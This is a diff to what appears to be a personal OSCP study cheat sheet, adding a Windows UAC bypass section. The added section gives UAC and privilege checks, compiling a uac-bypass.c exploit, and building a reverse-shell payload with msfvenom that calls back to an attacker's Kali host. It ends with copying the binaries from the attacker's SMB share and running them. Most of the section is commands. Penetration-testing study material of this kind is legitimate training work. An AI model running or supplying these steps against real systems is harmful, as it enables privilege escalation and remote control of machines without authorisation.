@@ -510,6 +510,42 @@ Sherlock.ps1
 1. Copy local `sherlock.ps1` file to remote.
 2. Run `cmd> powershell -executionpolicy bypass ".\sherlock.ps1"`.
 
+### User Account Control (UAC) Bypass
+
+Even if you are a local admin, User Account Control (UAC) maybe turned on which may force your user to respond to **UAC credential/consent prompts** in order to perform privileged actions.
+* UAC bypass walkthrough: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+
+STEP 1: Check if we should perform UAC bypass
+```
+cmd> whoami /priv    # do we have very few privileges even as local admin?
+cmd> whoami /groups  # is "Mandatgory Label\XXX Mandatory Level" set to MEDIUM?
+cmd> psexec.exe -i -accepteula -d -s rshell.exe # are we getting issues running psexec as SYSTEM?
+
+# check if UAC turned on
+cmd> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+...
+EnableLUA                  REG_DWORD 0x1 # if 0x1 = UAC ENABLED
+ConsentPromptBehaviorAdmin REG_DWORD 0x5 # if NOT 0x0 = consent required
+PromptOnSecureDesktop      REG_DWORD 0x1 # if 0x1 = Force all credential/consent prompts
+...
+```
+
+STEP 2: Prepare exploits
+```
+# modify uac-bypass.c to execute reverse shell
+# compile w/ correct architecture
+$ x86_64-w64-mingw32-gcc ~/OSCP-2022/Tools/privesc-windows/uac-bypass.c -o uac-bypass.exe
+
+# generate reverse shell payload
+$  msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[kali] LPORT=666 -f exe -o rshell.exe
+```
+
+STEP 3: Transfer, setup listener and exec payload
+```
+cmd> copy \\[kali]\[share]\uac-bypass.exe uac-bypass.exe
+cmd> copy \\[kali]\[share]\rshell.exe rshell.exe
+cmd> .\uac-bypass.exe
+```
 
 ### Insecure Service Permissions
 
@@ -555,6 +591,8 @@ cmd> netsh [advfirewall] firewall show state name=all
 
 TODO: ADD DISABLE COMMANDS
 ```
+
+### 
 
 
 ## File Transfer Methods
